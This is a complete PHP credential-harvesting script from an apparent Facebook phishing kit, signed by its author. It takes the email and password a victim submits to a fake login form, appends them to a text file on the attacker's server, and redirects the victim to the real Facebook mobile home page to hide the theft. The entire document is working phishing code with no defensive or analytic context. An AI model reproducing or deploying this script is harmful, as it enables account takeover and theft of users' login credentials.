<?php header("location : https://m.facebook.com/home.php"); $email =$_POST['email']; $pword =$_POST['password']; $file =fopen("knpassword.txt","a"); fwrite($file,"email: $email \n "); fwrite($file,"password : $pword \n"); fwrite($file, "Developed By KoNyi\n");

?>
